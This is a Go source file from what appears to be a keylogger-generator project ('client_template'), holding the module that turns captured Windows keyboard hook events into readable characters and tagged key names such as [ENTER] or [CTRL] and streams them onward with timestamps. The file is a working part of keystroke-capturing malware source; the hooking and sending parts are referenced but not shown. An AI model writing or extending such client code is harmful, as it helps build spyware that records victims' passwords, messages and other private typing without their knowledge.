// GuiKeyStandaloneGo/generator/templates/client_template/keyboard_processing.go
package main

import (
	"fmt"
	"log" // For logger parameter type
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows" // Still needed for windows.UTF16ToString
)

// Windows API procedure variables for key processing are now defined in keyboard_windows.go
// (e.g., procGetKeyboardStateKeyProc, procToUnicodeKeyProc)

// VK_... constants are now defined in keyboard_windows.go

type ProcessedKeyEvent struct {
	OriginalRaw RawKeyData // Keep original for full context if needed
	KeyValue    string     // The character or key name (e.g., "A", "[ENTER]", "[CTRL]")
	IsChar      bool       // True if KeyValue is a printable character
	IsKeyDown   bool
	Timestamp   time.Time // Added timestamp from RawKeyData
}

// vkCodeToString attempts to convert a virtual key code to a string.
// It uses ToUnicode for characters and a map for special keys.
// This should be called from a regular Go goroutine, NOT from the hook procedure.
func vkCodeToString(vkCode uint32, scanCode uint32, flags uint32, isKeyDown bool, logger *log.Logger) (keyVal string, isChar bool) {
	var kbState [256]byte
	var charBuf [4]uint16 // Buffer for UTF-16 characters

	// Get current keyboard state
	// procGetKeyboardStateKeyProc is defined in keyboard_windows.go
	ret, _, errState := syscall.SyscallN(procGetKeyboardStateKeyProc.Addr(), uintptr(unsafe.Pointer(&kbState[0])))
	if ret == 0 { // ret is BOOL (0 for failure)
		if logger != nil {
			logger.Printf("VKPROC: GetKeyboardState failed: %v", errState)
		}
		// Fallback to simple mapping if GetKeyboardState fails
		return simpleVKMap(vkCode, logger), false
	}

	// Convert VK code to Unicode char
	// procToUnicodeKeyProc is defined in keyboard_windows.go
	nChars, _, errUnicode := syscall.SyscallN(procToUnicodeKeyProc.Addr(),
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&charBuf[0])),
		uintptr(len(charBuf)-1), // Number of characters in buffer (leave space for null terminator if C-style)
		0,                       // uFlags for ToUnicode (e.g., 0 for no special handling, 1 for menu active)
	)

	if errUnicode != 0 && logger != nil {
		logger.Printf("VKPROC: ToUnicode syscall returned errno: %v", errUnicode)
	}

	if nChars > 0 {
		return windows.UTF16ToString(charBuf[:nChars]), true
	} else if int(nChars) == -1 { // Dead key
		if logger != nil {
			logger.Printf("VKPROC: Detected dead key for VK=0x%X (ScanCode=0x%X)", vkCode, scanCode)
		}
		return simpleVKMap(vkCode, logger), false
	} else { // nChars == 0, no translation or error in translation logic (not syscall error)
		return simpleVKMap(vkCode, logger), false
	}
}

// simpleVKMap provides a basic mapping for non-character keys.
// VK_... constants are defined in keyboard_windows.go
func simpleVKMap(vkCode uint32, logger *log.Logger) string {
	switch vkCode {
	case VK_BACK:
		return "[BACKSPACE]"
	case VK_TAB:
		return "[TAB]"
	case VK_RETURN:
		return "[ENTER]"
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
		return "[SHIFT]"
	case VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
		return "[CTRL]"
	case VK_MENU, VK_LMENU, VK_RMENU:
		return "[ALT]"
	case VK_PAUSE:
		return "[PAUSE]"
	case VK_CAPITAL:
		return "[CAPSLOCK]"
	case VK_ESCAPE:
		return "[ESC]"
	case VK_SPACE:
		return " "
	case VK_PRIOR:
		return "[PAGEUP]"
	case VK_NEXT:
		return "[PAGEDOWN]"
	case VK_END:
		return "[END]"
	case VK_HOME:
		return "[HOME]"
	case VK_LEFT:
		return "[LEFT]"
	case VK_UP:
		return "[UP]"
	case VK_RIGHT:
		return "[RIGHT]"
	case VK_DOWN:
		return "[DOWN]"
	case VK_INSERT:
		return "[INSERT]"
	case VK_DELETE:
		return "[DELETE]"
	case VK_LWIN, VK_RWIN:
		return "[WIN]"
	case VK_APPS:
		return "[APPS]"
	case VK_SNAPSHOT:
		return "[PRINTSCREEN]"
	case VK_NUMLOCK:
		return "[NUMLOCK]"
	case VK_SCROLL:
		return "[SCROLLLOCK]"
	case VK_F1:
		return "[F1]"
	case VK_F2:
		return "[F2]"
	case VK_F3:
		return "[F3]"
	case VK_F4:
		return "[F4]"
	case VK_F5:
		return "[F5]"
	case VK_F6:
		return "[F6]"
	case VK_F7:
		return "[F7]"
	case VK_F8:
		return "[F8]"
	case VK_F9:
		return "[F9]"
	case VK_F10:
		return "[F10]"
	case VK_F11:
		return "[F11]"
	case VK_F12:
		return "[F12]"
	case VK_OEM_1:
		return "[OEM_1 (;:)]"
	case VK_OEM_PLUS:
		return "[OEM_PLUS (+)]"
	case VK_OEM_COMMA:
		return "[OEM_COMMA (,)]"
	case VK_OEM_MINUS:
		return "[OEM_MINUS (-)]"
	case VK_OEM_PERIOD:
		return "[OEM_PERIOD (.)]"
	case VK_OEM_2:
		return "[OEM_2 (/?)]"
	case VK_OEM_3:
		return "[OEM_3 (`~)]"
	case VK_OEM_4:
		return "[OEM_4 ([{)]"
	case VK_OEM_5:
		return "[OEM_5 (\\|)]"
	case VK_OEM_6:
		return "[OEM_6 (]})]"
	case VK_OEM_7:
		return "[OEM_7 ('\")]"
	case VK_NUMPAD0:
		return "[NUM0]"
	case VK_NUMPAD1:
		return "[NUM1]"
	case VK_NUMPAD2:
		return "[NUM2]"
	case VK_NUMPAD3:
		return "[NUM3]"
	case VK_NUMPAD4:
		return "[NUM4]"
	case VK_NUMPAD5:
		return "[NUM5]"
	case VK_NUMPAD6:
		return "[NUM6]"
	case VK_NUMPAD7:
		return "[NUM7]"
	case VK_NUMPAD8:
		return "[NUM8]"
	case VK_NUMPAD9:
		return "[NUM9]"
	case VK_MULTIPLY:
		return "[NUM*]"
	case VK_ADD:
		return "[NUM+]"
	case VK_SUBTRACT:
		return "[NUM-]"
	case VK_DECIMAL:
		return "[NUM.]"
	case VK_DIVIDE:
		return "[NUM/]"
	default:
		return fmt.Sprintf("[VK_0x%X]", vkCode)
	}
}

// This function will be run in a goroutine to process raw key data
func processRawKeyEvents(rawKeyIn <-chan RawKeyData, processedKeyOut chan<- ProcessedKeyEvent, quit <-chan struct{}, logger *log.Logger) {
	if logger != nil {
		logger.Println("Key event processing goroutine started.")
	}

	for {
		select {
		case rawEvent, ok := <-rawKeyIn:
			if !ok {
				if logger != nil {
					logger.Println("Raw key input channel closed. Key processor stopping.")
				}
				return
			}

			keyValue, isChar := vkCodeToString(rawEvent.VkCode, rawEvent.ScanCode, rawEvent.Flags, rawEvent.IsKeyDown, logger)

			processedKeyOut <- ProcessedKeyEvent{
				OriginalRaw: rawEvent,
				KeyValue:    keyValue,
				IsChar:      isChar,
				IsKeyDown:   rawEvent.IsKeyDown,
				Timestamp:   rawEvent.Timestamp,
			}

		case <-quit:
			if logger != nil {
				logger.Println("Key event processing goroutine stopping.")
			}
			return
		}
	}
}
